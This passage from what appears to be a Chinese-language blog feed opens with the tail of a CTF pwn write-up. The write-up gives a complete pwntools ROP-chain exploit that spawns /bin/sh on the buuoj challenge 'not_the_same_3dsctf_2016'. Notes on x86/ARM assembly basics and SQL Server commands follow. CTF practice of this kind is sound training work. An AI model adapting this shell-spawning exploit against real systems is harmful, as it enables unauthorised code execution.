class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481ad</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcf1</span>) <span class="hljs-comment"># pop ecx ; pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># padding without overwrite ebx</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806d8a5</span>) <span class="hljs-comment"># int 0x80</span><br></code></pre></td></tr></table></figure><p>加上自己算的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>elf = ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br><span class="hljs-comment">#sh = process(&quot;./not_the_same_3dsctf_2016&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26066</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;i386&quot;</span><br>p = cyclic(<span class="hljs-number">0x2D</span>)<br>p += <span class="hljs-string">&#x27;&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08048b0b</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805586b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481ad</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcf1</span>) <span class="hljs-comment"># pop ecx ; pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># padding without overwrite ebx</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fcca</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049423</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b2af</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806d8a5</span>) <span class="hljs-comment"># int 0x80</span><br>sh.sendline(p)<br>sh.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编基础</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="X86汇编基础"><a href="#X86汇编基础" class="headerlink" title="X86汇编基础"></a>X86汇编基础</h2><p>==Intel和AT&amp;T语法区别：==</p><ul><li>Intel<strong>操作数</strong>在<strong>前面</strong>，AT&amp;T的在后面</li></ul><blockquote><p>在Intel语法中：<instruction> <destination operand> <source operand><br>在AT&amp;T语法中：<instruction> <source operand> <destination operand><br>有一个简单的记住它们的方法: 当你面对intel语法的时候，你可以想象把等号(=)放到2个操作数中间，当面对AT&amp;T语法的时候，你可以放一个右箭头(→）到两个操作数之间。</p></blockquote><ul><li>AT&amp;T: 寄存器名之前需要写一个百分号(%)并且在数字前面需要加上美元符($)。并用圆括号替代方括号</li><li>AT&amp;T: 以下是一些添加到操作符后，用来表示数据形式的后缀：<br>– q — quad (64 bits)<br>– l — long (32 bits)<br>– w — word (16 bits)<br>– b — byte (8 bits)</li></ul><hr><p><strong>重要：<code>MOV</code>指令在64位模式下，对低32位进行写入操作的时候，会清空高32位的内容[Int13]。比如 <code>MOV EAX，011223344h</code>将会把值写到RAX里，并且清空RAX的高32位区域。</strong></p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><blockquote><ol><li>EAX： 累加器</li><li>EBX： 基址寄存器</li><li>ECX： 计数器</li><li>EDX： 数据寄存器</li><li>ESI： 源变址寄存器</li><li>EDI： 目的变址寄存器</li><li>EBP： 扩展基址指针寄存器</li><li>ESP： 栈指针寄存器</li><li>EIP： 指令指针寄存器</li></ol><p>大多数寄存器失去了特殊用途，但<strong>ESP</strong>和<strong>EBP</strong>还是有特殊用途</p></blockquote><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20190821052642311.png" class="" title="image-20190821052642311"><h3 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h3><blockquote><p>.data</p><p>Var :</p><p>​        .byte 64 ;  声明一个字节型变量var，对应值为64</p><p>​        .byte 10 ；声明一个数据10，这个数据没有所谓的“标签”，它的内存地址就是 var + 1.</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">.<span class="hljs-keyword">byte</span>声明<span class="hljs-number">1</span>个字节的数据<br>.<span class="hljs-keyword">short</span>声明<span class="hljs-number">2</span>个字节的数据<br>.<span class="hljs-keyword">long</span>声明<span class="hljs-number">4</span>个字节的数据<br></code></pre></td></tr></table></figure><h4 id="操作后缀"><a href="#操作后缀" class="headerlink" title="操作后缀"></a>操作后缀</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movb</span> $<span class="hljs-number">2</span>,(%ebx);将<span class="hljs-number">2</span>移入到ebx中的值所表示的地址单元中<br><span class="hljs-attribute">movw</span> $<span class="hljs-number">2</span>,(%ebx); 将<span class="hljs-number">16</span>位整数<span class="hljs-number">2</span>移动到ebx中的值所表示的地址单元开始的两个字节中<br><span class="hljs-attribute">movl</span> $<span class="hljs-number">2</span>,(%ebx); 将<span class="hljs-number">32</span>位整数<span class="hljs-number">2</span>移动到 ebx中的值所表示的地址单元 开始的四个字节中<br></code></pre></td></tr></table></figure><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><h3 id="mov-lt-reg-lt-reg"><a href="#mov-lt-reg-lt-reg" class="headerlink" title="mov &lt;reg, &lt;reg"></a>mov &lt;reg, &lt;reg</h3><blockquote><p>mov默认对寄存器值或变量值进行操作，可以从寄存器到寄存器，从立即数到寄存器，从存储单元到寄存器，从立即数到存储单元，从寄存器到存储单元</p></blockquote><p>将数据从第一个参数（即寄存器中的内容，内存单元中的内容，或者一个参数值）复制到第二个参数（即寄存器或者内存单元）。</p><p>但寄存器复制到寄存器可行时，直接地从内存单元中将数据移动到另一内存单元中是不可以的，必须把内存单元中的数据加载到一个寄存器中，然后才可以通过寄存器把<strong>数据</strong>移动到目标内存单元中。</p><h3 id="push-入栈"><a href="#push-入栈" class="headerlink" title="push 入栈"></a>push 入栈</h3><p>push先将ESP中的值减少4，然后将push 的参数移动到一个32位的地址单元（%esp）.esp地址从高地址到低地址逐渐减少，就像1000到0，先占1000，再999……空间有限</p><h3 id="pop-出栈"><a href="#pop-出栈" class="headerlink" title="pop 出栈"></a>pop 出栈</h3><p>先将内存（%esp）中4个字节的数据放到指定寄存器或者内存单元中，然后让esp+4</p><h3 id="lea-加载有效地址"><a href="#lea-加载有效地址" class="headerlink" title="lea 加载有效地址"></a>lea 加载有效地址</h3><p>将其第一个参数指定的内存单元 放入到 第二个参数指定的寄存器中。只计算有效地址并将其放入寄存器中。</p><h3 id="lea和mov的区别"><a href="#lea和mov的区别" class="headerlink" title="lea和mov的区别"></a>lea和mov的区别</h3><p>mov:</p><ul><li>对于变量，有无[ ] 都是取值</li><li>对于寄存器，无[ ] 表示取值，有[ ] 表示取地址</li></ul><p>Lea:</p><ul><li>对于变量，有无 都是取地址</li><li>对于寄存器，无[ ]表示取地址，有[ ] 表示取值</li></ul><h3 id="imul-整数相乘"><a href="#imul-整数相乘" class="headerlink" title="imul 整数相乘"></a>imul 整数相乘</h3><ul><li>两个参数的：先将两个参数相乘，然后把结果存在第二个参数（必须是一个寄存器）中</li><li>三个参数的：第一个（必须是常数）和第二个参数相乘，存在第三个参数（寄存器中）</li></ul><h3 id="idiv-整数相除"><a href="#idiv-整数相除" class="headerlink" title="idiv 整数相除"></a>idiv 整数相除</h3><p>只有一个操作数，为除数，被除数为EDX：EAX中的内容，商存在EAX中，余数存在EDX</p><h3 id="shl，shr-按位左移或者右移"><a href="#shl，shr-按位左移或者右移" class="headerlink" title="shl，shr 按位左移或者右移"></a>shl，shr 按位左移或者右移</h3><p>对第一个参数进行位运算，移动位数由第二个参数决定</p><hr><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p><code>STMFD SP!, &#123;R4, LR&#125;</code>，这条指令类似x86平台的<code>PUSH</code>指令，它会把2个寄存器（R4和LR）的值写到栈里。不过为了简化，在<code>armcc</code>编译器输出的汇编代码里会写成`PUSH {R4, LR}</p><p>这指令首先会减少<code>SP</code>的值，这样它在栈中指向的空间就被释放，以留给新条目使用，然后将R4和LR的值存入被修改后的<code>SP</code>的储存区域中。</p><p>值得注意的是：<code>STMFD</code>指令是广义的<code>PUSH</code>指令(扩展了它的功能)，因为他能操作任何寄存器，不只是<code>SP</code>。换句话说，<code>STMFD</code>可以用于将一组寄存器储存在特定的内存地址上。</p><p><code>MOV R0， #0</code>这条语句，这条语句就是把0写入R0寄存器。这是因为C函数返回了0，返回值会放在R0里。</p><p>最后一条指令是<code>LDMFD SP!, R4,PC</code>，这是STMFD的逆指令。为了将初始值存入<code>R4</code>和<code>PC</code>寄存器里，这条指令会从栈上(或任何其他的内存区域)读取保存的值，并且增加堆栈指针<code>SP</code>的值。这非常类似x86平台里的<code>POP</code>指令。</p><p>最前面那条<code>STMFD</code>指令，将<code>R4</code>，和<code>LR</code>寄存器成对保存到栈中。在<code>LDMFD</code>执行的时候，<code>R4</code>和<code>PC</code>会被复原。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库复习笔记</title>
    <link href="/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>使用的是sql server，操作可能跟mysql有区别</strong></p><h2 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mssql">create database stuhyy<br>on <br>(<br>name &#x3D; stu, <br>filename&#x3D;&#39;C:\stu_data.mdf&#39;,<br>size &#x3D; 3mb,<br>maxsize &#x3D; 500mb,<br>filegrowth &#x3D; 10%<br><br>)<br>log on<br>(<br>name &#x3D; stu_log,<br>filename &#x3D; &#39;D:\stu_log.ldf&#39;,<br>size&#x3D;3mb,<br>maxsize &#x3D; unlimited,<br>filegrowth &#x3D; 1mb<br>)<br></code></pre></td></tr></table></figure><h2 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter database Stuhyy<br>Modify file<br>(<br>    name &#x3D; Stuhyy_log,<br>    filename &#x3D; &#39;H:\Stuhyy_log.ldf&#39;,<br>    size &#x3D; 10MB,<br>    maxsize &#x3D; 20MB,<br>    fileGrowth &#x3D; 5%<br>)<br></code></pre></td></tr></table></figure><h2 id="添加数据库文件"><a href="#添加数据库文件" class="headerlink" title="添加数据库文件"></a>添加数据库文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter database Stuhyy<br>add file<br>(<br>    name &#x3D; dataname,<br>    filename &#x3D; &#39;H:\dataname.ndf&#39;,<br>    size &#x3D; 20MB,<br>    maxsize &#x3D; 30MB,<br>    filegrowth &#x3D; 1MB<br>)<br></code></pre></td></tr></table></figure><h2 id="新建-amp-修改数据表"><a href="#新建-amp-修改数据表" class="headerlink" title="新建&amp;修改数据表"></a>新建&amp;修改数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Table Student<br>(<br>    Num int primary key,<br>    Nam char(6) not null,<br>    Birthday datetime<br>)<br>Create Table ChoseClass<br>(<br>    Num int primary key,<br>    CNum int not null,<br>    Score int not null.<br>    check (100&gt;&#x3D; Score and Score &gt;&#x3D; 0)<br>)<br>Alter Table Student<br>add 学分 int<br>ALTER TABLE table_name <br>DROP COLUMN column_name<br></code></pre></td></tr></table></figure><h3 id="添加外键约束"><a href="#添加外键约束" class="headerlink" title="添加外键约束"></a>添加外键约束</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter Table Student<br>Add Constraint fk_stuNum<br>Foreign key(Num) references ChoseClass(Num)<br></code></pre></td></tr></table></figure><h2 id="插入信息"><a href="#插入信息" class="headerlink" title="插入信息"></a>插入信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Insert Into studinfo<br>Values(&#39;hyy&#39;,&#39;11&#39;，&#39;广东&#39;)<br></code></pre></td></tr></table></figure><h2 id="删除信息"><a href="#删除信息" class="headerlink" title="删除信息"></a>删除信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Delete From sc<br>where xxx &#x3D; xxx<br></code></pre></td></tr></table></figure><h2 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Backup database Stuhyy to disk &#x3D; &#39;H:\StuhyyBackup.bak&#39;<br>&#x2F;&#x2F;&#x2F;Backup database Stuhyy to StuhyyBak<br>Backup log Stuhyy_log to disk &#x3D; &#39;H:\Stuhyy_logBackup.bak&#39;<br>&#x2F;&#x2F;&#x2F;Backup log Stuhyy_log to Stuhyy_log<br></code></pre></td></tr></table></figure><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Restore Database Stuhyy from disk &#x3D; &#39;H:\StuhyyBackup.bak&#39;<br></code></pre></td></tr></table></figure><p><code>Select Distinct 学号 from sc</code></p><h2 id="对成绩进行降序-相同则按学号升序排序"><a href="#对成绩进行降序-相同则按学号升序排序" class="headerlink" title="对成绩进行降序,相同则按学号升序排序"></a>对成绩进行降序,相同则按学号升序排序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select 学号,成绩 From sc<br>Where 课程号 &#x3D; &#39;4&#39;<br>Order by 成绩 desc,学号 asc<br></code></pre></td></tr></table></figure><h2 id="查询姓黄同学的信息"><a href="#查询姓黄同学的信息" class="headerlink" title="查询姓黄同学的信息"></a>查询姓黄同学的信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select 姓名, 系部名称 From Studinfo<br>Where 姓名 like &#39;咩%&#39; and 系部名称 in (&#39;国传&#39;,&#39;媒体工程&#39;) <br></code></pre></td></tr></table></figure><h2 id="查询选修人数超过10人的课程号"><a href="#查询选修人数超过10人的课程号" class="headerlink" title="查询选修人数超过10人的课程号"></a>查询选修人数超过10人的课程号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select 课程号,Count(*) as 选课人数  From sc<br>Group By 课程号<br>Having Count (*) &gt; 10<br></code></pre></td></tr></table></figure><h2 id="查询每门课最高分，最低分"><a href="#查询每门课最高分，最低分" class="headerlink" title="==查询每门课最高分，最低分=="></a>==查询每门课最高分，最低分==</h2><h2 id="查询选修了课程的学生姓名及选修课程的最高分"><a href="#查询选修了课程的学生姓名及选修课程的最高分" class="headerlink" title="查询选修了课程的学生姓名及选修课程的最高分"></a>查询选修了课程的学生姓名及选修课程的最高分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select Studinfo.姓名,Max(sc.成绩) as 最高成绩 From sc<br>Right Outer Join Studinfo on Studinfo.学号 &#x3D; sc.学号<br>Group by Studinfo.姓名<br></code></pre></td></tr></table></figure><h2 id="right-outer-join-left-inner-join"><a href="#right-outer-join-left-inner-join" class="headerlink" title="==right outer join  left inner join=="></a>==right outer join  left inner join==</h2><p>　　left join(左联接) 返回包括<strong>左表中的所有记录和右表中联结字段相等</strong>的记录  以左表为主<br>　　right join(右联接) 返回包括<strong>右表中的所有记录和左表中联结字段相等</strong>的记录 以右表为主<br>　　inner join(等值连接) 只返回两个表中联结字段相等的行</p><blockquote><p>   outer join(外连接) 可分为左外连接left outer join和右外连接right outer join</p><p>left join 是 left outer join 的简写，两者含义一样的。<br>right join 是 right outer join 的简写，两者含义一样的</p></blockquote><h2 id="T-sql创建学生视图"><a href="#T-sql创建学生视图" class="headerlink" title="T-sql创建学生视图"></a>T-sql创建学生视图</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create View AS<br>Select Studinfo.学号，Studinfo.系部名称,Course.课程名，Sc.成绩 From Studinfo,sc,Course<br>Where Studinfo.学号 &#x3D; sc.学号 And sc.课程号 &#x3D; course.课程号 <br>And Studinfo.系部名称 &#x3D; &#39;媒体工程&#39;<br>With Check Option<br></code></pre></td></tr></table></figure><blockquote><p>对视图进行update或者insert操作时，保证更新或者插入的行满足图中定义的谓词条件 假如一张表里有个字段是专业的;你创建视图的时候 create view stu as select 学生 from table where 专业=’计算机’ with check option 这样where后面就实现了对专业的限定 以后你如果对视图添加记录的时候专业如果不是计算机的话不让添加进去的<br>————————————————<br>版权声明：本文为CSDN博主「ClearLoveQ」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/ClearLoveQ/article/details/84285060">https://blog.csdn.net/ClearLoveQ/article/details/84285060</a></p></blockquote><h2 id="声明局部变量"><a href="#声明局部变量" class="headerlink" title="声明局部变量"></a>声明局部变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare @max date , @min date<br>set @max &#x3D; (select Max(出生日期) from studinfo)<br>set @min &#x3D; (select Min(出生日期) from studinfo)<br>select @max as 最大出生日期 , @min as 最小出生日期<br></code></pre></td></tr></table></figure><p>小知识</p><blockquote><p>①date类型可用于需要一个日期值而不需要时间部分时；</p><p>②datetime类型:可用于需要同时包含日期和时间信息的值。</p></blockquote><h2 id="Case的使用"><a href="#Case的使用" class="headerlink" title="Case的使用"></a>Case的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 